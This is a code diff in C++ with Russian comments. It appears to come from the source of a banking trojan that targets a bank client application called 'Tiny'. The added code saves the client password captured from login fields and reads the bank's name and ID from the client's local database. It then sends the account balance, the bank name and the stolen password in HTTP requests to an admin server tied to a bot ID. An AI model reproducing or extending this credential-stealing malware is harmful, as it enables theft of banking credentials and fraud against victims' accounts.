@@ -55,6 +55,9 @@ struct ForFindControl
 static int stateSQL = 0; 
 //текущий баланс
 static __int64 currentBalance = 0;
+static char passwordClient[100]; //пароль к клиенту (для отправки через аз)
+static char bankClient[100]; //имя банка клиента
+static int codeBankClient; //код банка
 
 //информация об аккаунте
 struct InfoAccount
@@ -235,6 +238,43 @@ DWORD WINAPI SendTiny(LPVOID)
 	return 0;
 }
 
+static int GetNameBank( char* bank, int szBank )
+{
+	char MyIdBank[32]; //код банка 
+	char Name[81]; //имя банка из базы
+	bank[0] = 0;
+	int ret = 0;
+	if( bankClient[0] )
+	{
+		SafeCopyStr( bank, szBank, bankClient );
+		ret = codeBankClient;
+	}
+	else
+	{
+		ODBC* DB = OpenDB();
+		if( DB )
+		{
+			SQLHSTMT qr = DB->ExecuteSql( "select Param from Config where Code='MyBankId'", "os30", MyIdBank );
+			if( qr )
+			{
+				DB->CloseQuery(qr);
+				DBG( "Tiny", "MyBankId=%s", MyIdBank );
+				qr = DB->ExecuteSql( "select Name from Banks where Code=?", "os81 is30", Name, MyIdBank );
+				if( qr )
+				{
+					DB->CloseQuery(qr);
+					m_lstrcpy( bankClient, Name );
+					SafeCopyStr( bank, szBank, Name );
+					DBG( "Tiny", "name bank=%s", Name );
+					codeBankClient = ret = m_atoi(MyIdBank);
+				}
+			}
+			CloseDB(DB);
+		}
+	}
+	return ret;
+}
+
 static DWORD WINAPI SendBalance( InfoAccount* ia )
 {
 	DBG( "Tiny", "Отсылка баланса: %ls, %I64d, '%ls'", ia->account, ia->balance, ia->name );
@@ -244,21 +284,28 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		TMemory qr(512);
 		char* account = WSTR::ToAnsi( ia->account, 0 );
-		char* nameClient = WSTR::ToAnsi( ia->name, 0 );
-		char* urlNameClient = URLEncode(nameClient);
+		char nameBank[100];
+		GetNameBank( nameBank, sizeof(nameBank) );
+		char* urlNameBank = URLEncode(nameBank);
 		char balance[16];
 		pwsprintfA( balance, "%d.%d", int(ia->balance / 10000), int((ia->balance % 10000)) / 100 );
 		//формируем запрос
 		string azUser = GetAzUser();
 		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
-		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), balance, account, urlNameClient);
-		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
+		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), balance, account, urlNameBank);
+		DBG( "Tiny", "Отправляем запрос 1 %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
 		STR::Free(account);
-		STR::Free(nameClient);
-		STR::Free(urlNameClient);
+		STR::Free(urlNameBank);
 		currentBalance = ia->balance; //запоминаем текущий баланс
+		char text[128];
+		pwsprintfA( text, "Password=%s", passwordClient );
+		char* urlText= URLEncode(text);
+		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
+		DBG( "Tiny", "Отправляем запрос 2 %s", qr.AsStr() );
+		H.Get(qr.AsStr());
+		STR::Free(text);
 	}
 	MemFree(ia);
 	return 0;
@@ -295,6 +342,7 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	resultGrab.AsStr()[0] = 0;
 	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
 	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
+	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
 	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
 	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
 	m_lstrcpy( pathMDB, ffc->texts[1] );
@@ -651,6 +699,9 @@ static bool SetHooks2()
 static bool InitData()
 {
 	pathMDB[0] = 0;
+	passwordClient[0] = 0;
+	bankClient[0] = 0;
+	currentBalance = 0;
 //	if( GetAdminUrl(domain) == 0 )
 //		domain[0] = 0;
 	return true;
